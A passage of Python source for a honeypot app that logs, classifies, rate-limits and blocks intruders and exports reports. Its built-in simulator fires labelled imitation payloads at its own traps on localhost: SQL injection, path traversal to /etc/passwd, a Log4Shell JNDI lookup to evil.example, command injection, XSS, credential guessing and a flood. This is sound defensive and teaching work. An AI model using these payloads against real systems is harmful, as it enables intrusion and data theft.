        for pw in self.PASSWORDS[:4]:
            self._say(f"  USER admin / PASS {pw}")
            self._hit(21, f"USER admin\r\nPASS {pw}\r\n".encode())
            time.sleep(0.25)

    def sc_sqli(self):
        if self._need(80):
            self._say("$ sqlmap -u 'http://127.0.0.1/login.php?id=1'    # imitation")
            self._say("  payload: id=1' UNION SELECT username,password FROM users--")
            self._hit(80, self._http("/login.php?id=1' UNION SELECT username,password FROM users--"))

    def sc_traversal(self):
        if self._need(80):
            self._say("$ curl 'http://127.0.0.1/../../../../etc/passwd'    # imitation")
            self._hit(80, self._http("/../../../../etc/passwd"))

    def sc_log4shell(self):
        if self._need(80):
            self._say("$ curl -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' http://127.0.0.1/    # imitation")
            self._hit(80, self._http("/", "X-Api-Version: ${jndi:ldap://evil.example/a}\r\n"))

    def sc_cmdi(self):
        if self._need(80):
            self._say("$ curl 'http://127.0.0.1/cgi-bin/ping?host=1.1.1.1;cat /etc/passwd'    # imitation")
            self._hit(80, self._http("/cgi-bin/ping?host=1.1.1.1;cat%20/etc/passwd"))

    def sc_xss(self):
        if self._need(80):
            self._say("$ curl 'http://127.0.0.1/search?q=<script>alert(1)</script>'    # imitation")
            self._hit(80, self._http("/search?q=<script>alert(1)</script>"))

    def sc_rdp(self):
        if self._need(3389):
            self._say("$ xfreerdp /v:127.0.0.1 /u:Administrator    # imitation")
            self._hit(3389, b"\x03\x00\x00\x2b\x26\xe0\x00\x00\x00\x00\x00Cookie: mstshash=Administrator\r\n")

    def sc_flood(self):
        if not self._need(80):
            return
        self._say("$ hping3 --flood -p 80 127.0.0.1    # 60 rapid connections (imitation)")
        accepted = sum(1 for _ in range(60) if self._hit(80, b"GET / HTTP/1.1\r\n\r\n", wait=0))
        self._say(f"  60 connections sent ({accepted} reached the listener) - watch the rate limiter react", "warn")

    def sc_full(self):
        for name in ("port_scan", "sqli", "traversal", "log4shell", "cmdi", "ssh_brute", "flood"):
            self.scenarios[name]()
            self._say("")
            time.sleep(0.8)
        self._say("== demo complete: open the Dashboard / Reports tabs to see the results ==", "ok")


class HoneypotEngine(QObject):
    attack_detected = pyqtSignal(dict)
    defense_event = pyqtSignal(dict)

    def __init__(self, config: ConfigManager, db: AttackDatabase, notifier: Notifier):
        super().__init__()
        self.config, self.db, self.notifier = config, db, notifier
        self.geo = GeoLocator(config)
        self.classifier = AttackClassifier()
        self.limiter = RateLimiter(config)
        self.defense = FirewallGuard(config, db)
        self.loop = None
        self.ready = Event()
        self.servers = {}          # port -> asyncio.Server
        self.bind_in_use = None
        self.status = {}           # port -> "listening" | "off" | error text
        self.hist = {}             # ip -> deque[(timestamp, port)]
        self.active = 0            # connections being handled right now
        self._ui_tokens, self._ui_last, self.ui_suppressed = 20.0, time.monotonic(), 0

    def _trap(self, port):
        return next((t for t in self.config.data["traps"] if t["port"] == port), None)

    @staticmethod
    def _abort(writer):
        try:
            writer.transport.abort()           # immediate RST, no buffering, no wait
        except Exception:
            pass

    def _ui_allow(self):
        """Global cap on events pushed to the dashboard so the UI never stutters under flood."""
        cap = max(1, int(self.config.data["limits"]["ui_max_per_sec"]))
        now = time.monotonic()
        self._ui_tokens = min(float(cap), self._ui_tokens + (now - self._ui_last) * cap)
        self._ui_last = now
        if self._ui_tokens >= 1:
            self._ui_tokens -= 1
            return True
        self.ui_suppressed += 1
        return False

    # ---- connection handler ----
    async def handle_intruder(self, reader, writer):
        counted = False
        try:
            peername = writer.get_extra_info("peername")
            sockname = writer.get_extra_info("sockname")
            if not peername or not sockname:
                self._abort(writer)
                return
            ip, port = peername[0], sockname[1]
            lim = self.config.data["limits"]

            if lim["enabled"]:
                if self.active >= int(lim["max_concurrent"]):
                    self.limiter.dropped_global += 1
                    self._abort(writer)
                    return
                verdict = self.limiter.check(ip, time.monotonic())
                if verdict != "ok":
                    self._abort(writer)
                    if verdict == "drop_first":      # log ONE summary event per IP per 30 s
                        await self._record(ip, port, self._trap(port),
                                           "Rate limit exceeded - connections dropped", flood=True)
                    return

            self.active += 1
            counted = True
            trap = self._trap(port)
            banner = trap["banner"] if trap else ""      # read live -> edits apply instantly
            payload_preview = "No payload sent (Passive probe)"
            try:
                if banner:
                    writer.write(banner.encode("utf-8", errors="ignore"))
                    await writer.drain()
                data = await asyncio.wait_for(reader.read(1024), timeout=2.0)
                if data:
                    payload_preview = data.decode("utf-8", errors="ignore")
            except Exception:
                pass
            finally:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass
            await self._record(ip, port, trap, payload_preview)
        except Exception:
            pass
        finally:
            if counted:
                self.active -= 1

    async def _record(self, ip, port, trap, payload, flood=False):
        loop = asyncio.get_running_loop()
        now = time.time()
        dcfg = self.config.data["defense"]

        hist = self.hist.setdefault(ip, deque(maxlen=500))
        hist.append((now, port))
        keep = max(60, int(dcfg["window_sec"]))
        while hist and now - hist[0][0] > keep:
            hist.popleft()

        recent60 = [h for h in hist if now - h[0] <= 60]
        if flood:
            atype, sig_sev = "DoS / Flood", "HIGH"
        else:
            atype, sig_sev = self.classifier.classify(port, payload, recent60)
        score = threat_score(atype, len(hist), len({h[1] for h in recent60}), not payload.startswith("No payload"))
        trap_sev = trap["severity"] if trap else "MEDIUM"
        geo = self.geo.lookup(ip)
        incident = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": ip, "port": port,
            "service": trap["service"] if trap else "Unknown Service",
            "payload": payload,
            "severity": "HIGH" if "HIGH" in (trap_sev, sig_sev) else "MEDIUM",
            "attack_type": atype,
            "country_code": geo["country_code"], "country": geo["country"],
            "lat": geo["lat"], "lon": geo["lon"],
            "threat_score": score, "risk": risk_level(score),
        }
        try:
            _, row_hash = await loop.run_in_executor(None, self.db.insert, incident)
            incident["hash"] = row_hash[:12]
        except Exception as e:
            print(f"[!] DB insert failed: {e}")

        reason = self.defense.should_block(incident, len(hist))
        if reason:
            ev = await loop.run_in_executor(None, self.defense.block, ip, reason)
            if ev:
                incident["blocked"] = ev["status"]
                self.defense_event.emit(ev)

        self.notifier.notify(incident)
        if self._ui_allow():
            self.attack_detected.emit(incident)

    # ---- housekeeping: auto-unblock + memory pruning ----
    async def _janitor(self):
        loop = asyncio.get_running_loop()
        while True:
            await asyncio.sleep(60)
            try:
                mins = int(self.config.data["defense"]["auto_unblock_min"])
                if mins > 0:
                    for ip in self.db.blocks_older_than(mins):
                        ok, detail = await loop.run_in_executor(None, self.defense.unblock, ip)
                        self.defense_event.emit({"ip": ip, "status": "unblocked" if ok else "failed",
                                                 "reason": "auto-unblock", "detail": detail})
                now = time.time()
                for k in [k for k, d in self.hist.items() if not d or now - d[-1][0] > 3600]:
                    del self.hist[k]
            except Exception:
                pass

    # ---- dynamic server management ----
    async def _sync_servers(self):
        cfg = self.config.data
        host = cfg["bind_host"]
        wanted = {t["port"]: t for t in cfg["traps"] if t["enabled"]}

        for port in list(self.servers):
            if port not in wanted or host != self.bind_in_use:
                srv = self.servers.pop(port)
                srv.close()
                try:
                    await asyncio.wait_for(srv.wait_closed(), timeout=3)
                except Exception:
                    pass
        self.bind_in_use = host

        for port in wanted:
            if port in self.servers:
                continue
            try:
                srv = await asyncio.start_server(self.handle_intruder, host, port, reuse_address=True)
                self.servers[port] = srv
                print(f"[*] Honeypot active on {host}:{port}")
            except Exception as e:
                print(f"[!] Port {port}: {e}")
                self.status[port] = f"error: {e}"

        status = {}
        for t in cfg["traps"]:
            p = t["port"]
            if p in self.servers:
                status[p] = "listening"
            elif not t["enabled"]:
                status[p] = "off"
            else:
                status[p] = self.status.get(p, "error")
        self.status = status
        return status

    def apply_config(self):
        """Called from the UI thread; blocks briefly until servers are synced."""
        self.ready.wait(timeout=5)
        fut = asyncio.run_coroutine_threadsafe(self._sync_servers(), self.loop)
        return fut.result(timeout=10)

    def run_event_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.ready.set()
        self._janitor_task = self.loop.create_task(self._janitor())
        self.loop.run_until_complete(self._sync_servers())
        self.loop.run_forever()


# ==========================================
# 4. REPORT GENERATOR (CSV / PDF)
# ==========================================
PDF_TEXT = {
    "en": {
        "title": "NetDeceptor Security Audit Report", "period": "Period", "generated": "Generated",
        "summary": "Executive Summary", "metric": "Metric", "value": "Value",
        "total": "Total intercepted attacks", "unique": "Unique source IPs",
        "high": "High-severity events", "busiest": "Busiest hour of day",
        "by_hour": "Attacks by Hour of Day", "top_ips": "Top Attacker IPs",
        "ip": "Source IP", "attempts": "Attempts", "last_seen": "Last seen",
        "top_services": "Most Targeted Services", "port": "Port", "service": "Service", "hits": "Hits",
        "ranges": {"24h": "Last 24 hours", "7d": "Last 7 days", "30d": "Last 30 days", "all": "All time"},
    },
    "th": {
        "title": "รายงานตรวจสอบความปลอดภัย NetDeceptor", "period": "ช่วงเวลา", "generated": "สร้างเมื่อ",
        "summary": "สรุปผลสำหรับผู้บริหาร", "metric": "ตัวชี้วัด", "value": "ค่า",
        "total": "จำนวนการโจมตีที่ดักได้ทั้งหมด", "unique": "จำนวน IP ต้นทางที่ไม่ซ้ำ",
        "high": "เหตุการณ์ความรุนแรงสูง", "busiest": "ช่วงเวลาที่ถูกโจมตีมากที่สุด",
        "by_hour": "การโจมตีแยกตามชั่วโมงของวัน", "top_ips": "IP ผู้โจมตีสูงสุด",
        "ip": "IP ต้นทาง", "attempts": "จำนวนครั้ง", "last_seen": "พบล่าสุด",
        "top_services": "บริการที่ถูกโจมตีมากที่สุด", "port": "พอร์ต", "service": "บริการ", "hits": "จำนวนครั้ง",
        "ranges": {"24h": "24 ชั่วโมงล่าสุด", "7d": "7 วันล่าสุด", "30d": "30 วันล่าสุด", "all": "ทั้งหมด"},
    },
}

ATTACK_TYPE_TH = {
    "SQL Injection": "SQL Injection", "Directory Traversal": "Directory Traversal", "Log4Shell": "Log4Shell",
    "Command Injection": "Command Injection", "XSS": "XSS", "Scanner Tool": "เครื่องมือสแกน",
    "Credential Attempt": "พยายามล็อกอิน", "Web Recon": "สำรวจเว็บ", "Port Scan": "สแกนพอร์ต",
    "Brute-force": "เดารหัสผ่าน (Brute-force)", "Probe": "การสำรวจทั่วไป", "DoS / Flood": "ถล่มระบบ (DoS)",
    "Unclassified": "ไม่ระบุประเภท",
}
PDF_TEXT["en"].update({
    "types_title": "Attack Types", "type": "Type", "countries_title": "Top Source Countries",
    "country": "Country", "integrity": "Log Integrity (SHA-256 hash chain)",
    "verified": "VERIFIED - {n} records, chain intact.",
    "broken": "TAMPERING DETECTED at record #{id}: {reason}", "head": "Chain head hash", "risk": "Risk",
})
PDF_TEXT["th"].update({
    "types_title": "ประเภทการโจมตี", "type": "ประเภท", "countries_title": "ประเทศต้นทางสูงสุด",
    "country": "ประเทศ", "integrity": "ความสมบูรณ์ของ Log (SHA-256 hash chain)",
    "verified": "ผ่านการตรวจสอบ - {n} รายการ ห่วงโซ่ข้อมูลครบถ้วน",
    "broken": "ตรวจพบการแก้ไขข้อมูลที่รายการ #{id}: {reason}", "head": "ค่า Hash ปลายห่วงโซ่", "risk": "ความเสี่ยง",
})

# Thai-capable TTF fonts (reportlab's built-in Helvetica cannot draw Thai).
# Best result: drop THSarabunNew.ttf + "THSarabunNew Bold.ttf" into a ./fonts folder next to this script.
THAI_FONT_CANDIDATES = [
    (BASE_DIR / "fonts" / "THSarabunNew.ttf", BASE_DIR / "fonts" / "THSarabunNew Bold.ttf"),
    (BASE_DIR / "fonts" / "NotoSansThai-Regular.ttf", BASE_DIR / "fonts" / "NotoSansThai-Bold.ttf"),
    (Path("C:/Windows/Fonts/tahoma.ttf"), Path("C:/Windows/Fonts/tahomabd.ttf")),
    (Path("/System/Library/Fonts/Supplemental/Tahoma.ttf"), Path("/System/Library/Fonts/Supplemental/Tahoma Bold.ttf")),
    (Path("/usr/share/fonts/truetype/tlwg/Garuda.ttf"), Path("/usr/share/fonts/truetype/tlwg/Garuda-Bold.ttf")),
    (Path("/usr/share/fonts/truetype/tlwg/Loma.ttf"), Path("/usr/share/fonts/truetype/tlwg/Loma-Bold.ttf")),
]
_THAI_FONT = None


def register_thai_font():
    """Returns (regular_name, bold_name) or None when no Thai font is available."""
    global _THAI_FONT
    if _THAI_FONT is not None:
        return _THAI_FONT or None
    if HAS_REPORTLAB:
        for reg, bold in THAI_FONT_CANDIDATES:
            if reg.exists():
                try:
                    pdfmetrics.registerFont(TTFont("ND-Thai", str(reg)))
                    bold_name = "ND-Thai"
                    if bold.exists():
                        pdfmetrics.registerFont(TTFont("ND-Thai-Bold", str(bold)))
                        bold_name = "ND-Thai-Bold"
                    _THAI_FONT = ("ND-Thai", bold_name)
                    return _THAI_FONT
                except Exception:
                    continue
    _THAI_FONT = False
    return None


def export_csv(db: AttackDatabase, path, range_key):
    rows = db.rows(range_key)
    with open(path, "w", newline="", encoding="utf-8-sig") as f:   # utf-8-sig -> opens cleanly in Excel
        w = csv.writer(f)
        w.writerow(["id", "timestamp", "ip", "country_code", "country", "port", "service", "severity",
                    "attack_type", "threat_score", "risk", "payload", "row_hash"])
        for r in rows:
            sc = r["threat_score"] or 0
            w.writerow([r["id"], r["ts"], r["ip"], r["country_code"], r["country"], r["port"], r["service"],
                        r["severity"], r["attack_type"], sc, risk_level(sc),
                        r["payload"].replace("\r", " ").replace("\n", " "), r["row_hash"]])
    return len(rows)


def export_json(db: AttackDatabase, path, range_key):
    rows = db.rows(range_key)
    for r in rows:
        r["risk"] = risk_level(r["threat_score"] or 0)
    st = db.stats(range_key)
    doc = {
        "generated": datetime.now().isoformat(timespec="seconds"), "range": range_key,
        "summary": {k: st[k] for k in ("total", "unique_ips", "high", "blocked")},
        "top_ips": st["top_ips"], "top_types": st["top_types"], "top_countries": st["top_countries"],
        "top_ports": st["top_ports"], "hourly": st["hourly"], "integrity": db.verify_chain(), "records": rows,
    }
    with open(path, "w", encoding="utf-8") as f:
        json.dump(doc, f, ensure_ascii=False, indent=2)
    return len(rows)


def export_pdf(db: AttackDatabase, path, range_key, lang="en"):
    L = PDF_TEXT.get(lang, PDF_TEXT["en"])
    fonts = register_thai_font() if lang == "th" else None
    regular, bold = fonts or ("Helvetica", "Helvetica-Bold")
    size = 12 if lang == "th" else 9

    s = db.stats(range_key)
    base = getSampleStyleSheet()
    st_title = ParagraphStyle("ndT", parent=base["Title"], fontName=bold, fontSize=22, leading=28)
    st_h2 = ParagraphStyle("ndH", parent=base["Heading2"], fontName=bold, fontSize=size + 5, leading=size + 9)
    st_n = ParagraphStyle("ndN", parent=base["Normal"], fontName=regular, fontSize=size + 1, leading=size + 6)
    blue = colors.HexColor("#0066FF")

    doc = SimpleDocTemplate(path, pagesize=A4, leftMargin=18 * mm, rightMargin=18 * mm,
                            topMargin=16 * mm, bottomMargin=16 * mm, title=L["title"])

    def table(data, widths):
        t = Table(data, colWidths=widths, repeatRows=1)
        t.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), blue),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
            ("FONTNAME", (0, 0), (-1, 0), bold),
            ("FONTNAME", (0, 1), (-1, -1), regular),
            ("FONTSIZE", (0, 0), (-1, -1), size),
            ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F0F7FF")]),
            ("GRID", (0, 0), (-1, -1), 0.25, colors.HexColor("#CBD5E1")),
            ("TOPPADDING", (0, 0), (-1, -1), 4), ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ]))
        return t

    busiest = f"{max(range(24), key=lambda h: s['hourly'][h]):02d}:00" if s["total"] else "-"
    story = [
        Paragraph(L["title"], st_title),
        Paragraph(f"{L['period']}: {L['ranges'].get(range_key, range_key)} &nbsp;|&nbsp; "
                  f"{L['generated']}: {datetime.now():%Y-%m-%d %H:%M:%S}", st_n),
        Spacer(1, 8 * mm),
        Paragraph(L["summary"], st_h2),
        table([[L["metric"], L["value"]],
               [L["total"], s["total"]],
               [L["unique"], s["unique_ips"]],
               [L["high"], s["high"]],
               [L["busiest"], busiest]],
              [95 * mm, 55 * mm]),
        Spacer(1, 6 * mm),
        Paragraph(L["by_hour"], st_h2),
    ]

    d = Drawing(170 * mm, 55 * mm)
    chart = VerticalBarChart()
    chart.x, chart.y, chart.width, chart.height = 10, 15, 450, 120
    chart.data = [s["hourly"]]
    chart.categoryAxis.categoryNames = [f"{h:02d}" for h in range(24)]
    chart.categoryAxis.labels.fontSize = 7
    chart.valueAxis.valueMin = 0
    chart.valueAxis.labels.fontSize = 7
    chart.bars[0].fillColor = blue
    d.add(chart)
    story += [d, Spacer(1, 4 * mm), Paragraph(L["top_ips"], st_h2)]

    ip_head = [L["ip"], L["attempts"], L["risk"], L["last_seen"]]
    ip_rows = [ip_head] + ([[r["ip"], r["hits"], f"{r['score']} {risk_level(r['score'])}", r["last_seen"]]
                            for r in s["top_ips"]] or [["-", "-", "-", "-"]])
    story += [table(ip_rows, [48 * mm, 24 * mm, 36 * mm, 50 * mm]), Spacer(1, 6 * mm),
              Paragraph(L["top_services"], st_h2)]

    port_head = [L["port"], L["service"], L["hits"]]
    port_rows = [port_head] + ([[r["port"], r["service"], r["hits"]] for r in s["top_ports"]] or [["-", "-", "-"]])
    story.append(table(port_rows, [25 * mm, 95 * mm, 30 * mm]))

    tname = (lambda n: ATTACK_TYPE_TH.get(n, n)) if lang == "th" else (lambda n: n)
    type_rows = [[L["type"], L["hits"]]] + ([[tname(r["attack_type"]), r["hits"]] for r in s["top_types"]] or [["-", "-"]])
    ctry_rows = [[L["country"], L["hits"]]] + (
        [[f"{r['country'] or r['country_code']} ({r['country_code']})", r["hits"]] for r in s["top_countries"]] or [["-", "-"]])
    ig = db.verify_chain()
    verdict = L["verified"].format(n=ig["count"]) if ig["ok"] else L["broken"].format(id=ig["broken_id"], reason=ig["reason"])
    story += [Spacer(1, 6 * mm), Paragraph(L["types_title"], st_h2), table(type_rows, [95 * mm, 30 * mm]),
              Spacer(1, 6 * mm), Paragraph(L["countries_title"], st_h2), table(ctry_rows, [95 * mm, 30 * mm]),
              Spacer(1, 6 * mm), Paragraph(L["integrity"], st_h2), Paragraph(verdict, st_n),
              Paragraph(f"{L['head']}: <font size=7>{ig['head']}</font>", st_n)]

    doc.build(story)
    return s["total"]


# ==========================================
# 5. PYTHON <-> JS BRIDGE (QWebChannel, two-way)
# ==========================================
class Bridge(QObject):
    event = pyqtSignal(str)          # async results pushed to JS (simulator output, online checks)
    DEMO_IP = "45.33.32.156"
    def __init__(self, config, db, engine, notifier, window):
        super().__init__()
        self.config, self.db, self.engine = config, db, engine
        self.notifier, self.window = notifier, window
        self.sim = AttackSimulator(engine, lambda d: self.event.emit(json.dumps(d)))

    @pyqtSlot(result=str)
    def get_state(self):
        return json.dumps({
            "config": self.config.data,
            "status": {str(k): v for k, v in self.engine.status.items()},
            "stats": self.db.stats("all"),
            "history": self.db.recent(50),
            "has_pdf": HAS_REPORTLAB,
            "defense": self._defense_state(),
        })

    def _defense_state(self):
        e = self.engine
        return {
            "defense": self.config.data["defense"], "limits": self.config.data["limits"],
            "geo": {"db_path": self.config.data["geo"]["db_path"], "status": e.geo.status},
            "blocks": self.db.list_blocks(), "is_admin": e.defense.is_admin, "platform": sys.platform,
            "dropped": e.limiter.total_dropped + e.limiter.dropped_global,
            "ui_suppressed": e.ui_suppressed, "active": e.active,
        }

    @pyqtSlot(result=str)
    def get_defense(self):
        return json.dumps(self._defense_state())

    @pyqtSlot(str, result=str)
    def save_defense(self, payload):
        try:
            data = json.loads(payload)
            d, l = data["defense"], data["limits"]
            allow = []
            for entry in d.get("allowlist", []):
                entry = str(entry).strip()
                if entry:
                    ipaddress.ip_network(entry, strict=False)      # raises on garbage
                    allow.append(entry)
            self.config.data["defense"].update({
                "enabled": bool(d["enabled"]), "dry_run": bool(d["dry_run"]),
                "threshold": max(1, int(d["threshold"])), "window_sec": max(10, int(d["window_sec"])),
                "block_on_high": bool(d["block_on_high"]), "block_on_flood": bool(d["block_on_flood"]),
                "protect_private": bool(d["protect_private"]),
                "auto_unblock_min": max(0, int(d["auto_unblock_min"])), "allowlist": allow,
            })
            self.config.data["limits"].update({
                "enabled": bool(l["enabled"]), "per_ip_rate": max(0.1, float(l["per_ip_rate"])),
                "per_ip_burst": max(1, int(l["per_ip_burst"])),
                "max_concurrent": max(10, int(l["max_concurrent"])),
                "ui_max_per_sec": max(1, int(l["ui_max_per_sec"])),
            })
            self.config.data["geo"]["db_path"] = str(data.get("geo", {}).get("db_path", "")).strip()
            self.config.save()
            self.engine.defense.noted.clear()          # let previously failed/protected IPs be re-evaluated
            self.engine.geo.reopen()
            return json.dumps({"ok": True, "state": self._defense_state()})
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})

    @pyqtSlot(str, result=str)
    def unblock_ip(self, ip):
        ok, detail = self.engine.defense.unblock(ip.strip())
        return json.dumps({"ok": ok, "detail": detail})

    @pyqtSlot(result=str)
    def verify_integrity(self):
        return json.dumps(self.db.verify_chain())

    # ---------- simulator / trace / self-check / lists ----------
    @pyqtSlot(str, result=str)
    def set_onboarded(self, _flag):
        self.config.data["onboarded"] = True
        self.config.save()
        return json.dumps({"ok": True})

    @pyqtSlot(result=str)
    def get_timeline(self):
        return json.dumps(self.db.timeline(60))

    @pyqtSlot(str, result=str)
    def run_simulation(self, kind):
        ok, msg = self.sim.start(kind)
        return json.dumps({"ok": ok, "error": None if ok else msg})

    TRACE = {
        "port_scan": (22, "No payload sent (Passive probe)", [21, 22, 80]),
        "ssh_brute": (22, "SSH-2.0-libssh_0.9.6", [22] * 6),
        "sqli": (80, "GET /login.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1", [80]),
        "traversal": (80, "GET /../../../../etc/passwd HTTP/1.1", [80]),
        "log4shell": (80, "GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://evil.example/a}", [80]),
        "flood": (80, "Rate limit exceeded - connections dropped", [80] * 40),
    }

    @pyqtSlot(str, result=str)
    def trace_attack(self, kind):
        """Runs a sample attack through the REAL logic (limiter, classifier, GeoIP, hash preview,
        alert formatting, defense decision) without writing to the DB, sending alerts or touching the firewall."""
        if kind not in self.TRACE:
            return json.dumps({"ok": False, "error": "unknown scenario"})
        port, payload, ports = self.TRACE[kind]
        e, cfg, ip = self.engine, self.config.data, self.DEMO_IP
        now = time.time()
        recent = [(now, p) for p in ports]
        flood = kind == "flood"
        trap = e._trap(port)
        steps = []

        steps.append({"id": "capture", "status": "ok", "data": {
            "ip": ip, "port": port, "service": trap["service"] if trap else "Unknown Service",
            "enabled": bool(trap and trap["enabled"]), "payload": payload[:90]}})

        lim = cfg["limits"]
        rl = RateLimiter(self.config)
        verdicts = [rl.check(ip, 1000.0) for _ in range(40 if flood else 1)]
        okn = verdicts.count("ok")
        steps.append({"id": "ratelimit", "status": "warn" if flood else "ok", "data": {
            "enabled": lim["enabled"], "rate": lim["per_ip_rate"], "burst": lim["per_ip_burst"],
            "checked": len(verdicts), "passed": okn, "dropped": len(verdicts) - okn}})

        if flood:
            atype, sig_sev = "DoS / Flood", "HIGH"
        else:
            atype, sig_sev = e.classifier.classify(port, payload, recent)
        trap_sev = trap["severity"] if trap else "MEDIUM"
        severity = "HIGH" if "HIGH" in (trap_sev, sig_sev) else "MEDIUM"
        score = threat_score(atype, len(recent), len({p for _, p in recent}), not payload.startswith("No payload"))
        steps.append({"id": "classify", "status": "warn" if severity == "HIGH" else "ok", "data": {
            "type": atype, "severity": severity, "score": score, "risk": risk_level(score),
            "hits": len(recent), "ports": len({p for _, p in recent})}})

        geo = e.geo.lookup(ip)
        steps.append({"id": "geo", "status": "ok" if geo["country_code"] else "skip", "data": {
            "ip": ip, "cc": geo["country_code"], "country": geo["country"], "db": e.geo.status}})

        incident = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "ip": ip, "port": port,
            "service": trap["service"] if trap else "Unknown Service", "payload": payload, "severity": severity,
            "attack_type": atype, "country_code": geo["country_code"], "country": geo["country"],
            "threat_score": score,
        }
        pv = self.db.preview(incident)
        steps.append({"id": "db", "status": "ok", "data": {"prev": pv["prev"][:16], "hash": pv["hash"][:16]}})

        n = cfg["notify"]
        channels = [name for name, ok in (("Telegram", n["telegram_token"] and n["telegram_chat_id"]),
                                          ("LINE", n["line_channel_token"] and n["line_user_id"])) if ok]
        passes = Notifier.SEV_RANK.get(severity, 1) >= Notifier.SEV_RANK.get(n["min_severity"], 2)
        sendable = bool(n["enabled"] and channels and passes)
        steps.append({"id": "notify", "status": "ok" if sendable else "skip", "data": {
            "enabled": n["enabled"], "channels": channels, "min": n["min_severity"], "passes": passes,
            "preview": self.notifier._format(incident)}})

        d = cfg["defense"]
        reason = e.defense.should_block(incident, len(recent))
        why = e.defense.protected_reason(ip)
        mode = "off" if not d["enabled"] else ("dry_run" if d["dry_run"] else "live")
        outcome = "none" if not reason else ("protected" if why else ("dry_run" if mode == "dry_run" else "block"))
        steps.append({"id": "defense", "status": {"block": "warn", "dry_run": "warn"}.get(outcome, "ok" if outcome != "none" else "skip"),
                      "data": {"mode": mode, "reason": reason, "protected": why, "outcome": outcome,
                               "threshold": d["threshold"], "window": d["window_sec"]}})
        return json.dumps({"ok": True, "kind": kind, "steps": steps})

    def _offline_checks(self):
        e, cfg = self.engine, self.config.data
        out = []

        def add(i, status, detail):
            out.append({"id": i, "status": status, "detail": detail})

        try:
            with self.db.lock:
                self.db.conn.execute("SELECT 1").fetchone()
            add("db", "ok", f"{self.db.path.name} ({self.db.path.stat().st_size // 1024} KB)")
        except Exception as ex:
            add("db", "fail", str(ex))
        ig = self.db.verify_chain()
        add("chain", "ok" if ig["ok"] else "fail",
            f"{ig['count']} records" if ig["ok"] else f"broken at #{ig['broken_id']}: {ig['reason']}")
        enabled = [t for t in cfg["traps"] if t["enabled"]]
        listening = [t for t in enabled if e.status.get(t["port"]) == "listening"]
        failed = [str(t["port"]) for t in enabled if t not in listening]
        add("ports", "ok" if enabled and not failed else ("fail" if not listening else "warn"),
            f"{len(listening)}/{len(enabled)} listening" + (f" - failed: {', '.join(failed)}" if failed else ""))
        add("admin", "ok" if e.defense.is_admin else "warn",
            "granted" if e.defense.is_admin else "not elevated - live blocking will fail (dry-run still works)")
        tool = {"win32": "netsh"}.get(sys.platform, "iptables" if sys.platform.startswith("linux") else None)
        found = bool(tool and shutil.which(tool))
        add("fwtool", "ok" if found else "warn", f"{tool} found" if found else f"{tool or 'no supported tool'} not found")
        d = cfg["defense"]
        add("defense", "ok" if d["enabled"] and not d["dry_run"] else "warn",
            "live blocking" if d["enabled"] and not d["dry_run"] else ("dry-run" if d["enabled"] else "disabled"))
        add("limiter", "ok" if cfg["limits"]["enabled"] else "warn", "enabled" if cfg["limits"]["enabled"] else "disabled")
        add("geo", "ok" if e.geo.reader else "warn", e.geo.status)
        n = cfg["notify"]
        tg = bool(n["telegram_token"] and n["telegram_chat_id"])
        ln = bool(n["line_channel_token"] and n["line_user_id"])
        add("telegram", "ok" if tg else "warn", "configured" if tg else "not configured")
        add("line", "ok" if ln else "warn", "configured" if ln else "not configured")
        add("alerts", "ok" if n["enabled"] and (tg or ln) else "warn",
            "enabled" if n["enabled"] and (tg or ln) else "disabled or no channel")
        add("pdf", "ok" if HAS_REPORTLAB else "warn", "reportlab installed" if HAS_REPORTLAB else "pip install reportlab")
        if HAS_REPORTLAB:
            add("thaifont", "ok" if register_thai_font() else "warn",
                "Thai font found" if register_thai_font() else "no Thai TTF - put THSarabunNew.ttf in ./fonts")
        add("config", "ok" if os.access(BASE_DIR, os.W_OK) else "fail",
            "config / database folder is writable" if os.access(BASE_DIR, os.W_OK) else "folder is read-only")
        return out

    @pyqtSlot(result=str)
    def self_check(self):
        return json.dumps(self._offline_checks())

    @pyqtSlot(result=str)
    def check_online(self):
        def work():
            n = self.config.data["notify"]
            res = []
            if n["telegram_token"]:
                try:
                    with urllib.request.urlopen(f"https://api.telegram.org/bot{n['telegram_token']}/getMe", timeout=8) as r:
                        name = json.loads(r.read().decode()).get("result", {}).get("username", "?")
                    res.append({"id": "telegram", "status": "ok", "detail": f"token active (@{name})"})
                except Exception as ex:
                    res.append({"id": "telegram", "status": "fail", "detail": f"token rejected / unreachable: {ex}"})
            if n["line_channel_token"]:
                try:
                    req = urllib.request.Request("https://api.line.me/v2/bot/info",
                                                 headers={"Authorization": f"Bearer {n['line_channel_token']}"})
                    with urllib.request.urlopen(req, timeout=8) as r:
                        name = json.loads(r.read().decode()).get("displayName", "?")
                    res.append({"id": "line", "status": "ok", "detail": f"token active ({name})"})
                except Exception as ex:
                    res.append({"id": "line", "status": "fail", "detail": f"token rejected / unreachable: {ex}"})
            self.event.emit(json.dumps({"kind": "online", "items": res}))
        Thread(target=work, daemon=True).start()
        return json.dumps({"ok": True})

    @pyqtSlot(str, result=str)
    def block_ip_manual(self, ip):
        ev = self.engine.defense.manual_block(ip.strip(), "manual")
        self.engine.defense_event.emit(ev)
        return json.dumps({"ok": ev["status"] in ("blocked", "dry_run"), "event": ev})

    @pyqtSlot(str, result=str)
    def whitelist_ip(self, ip):
        try:
            ip = ip.strip()
            ipaddress.ip_network(ip, strict=False)
            allow = self.config.data["defense"]["allowlist"]
            if ip not in allow:
                allow.append(ip)
            self.config.save()
            self.engine.defense.noted.discard(ip)
            if "/" not in ip:
                self.engine.defense.unblock(ip)         # lift an existing block (false positive)
            return json.dumps({"ok": True})
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})

    @pyqtSlot(str, result=str)
    def remove_whitelist(self, entry):
        allow = self.config.data["defense"]["allowlist"]
        if entry in allow:
            allow.remove(entry)
            self.config.save()
        return json.dumps({"ok": True})

    @pyqtSlot(str, result=str)
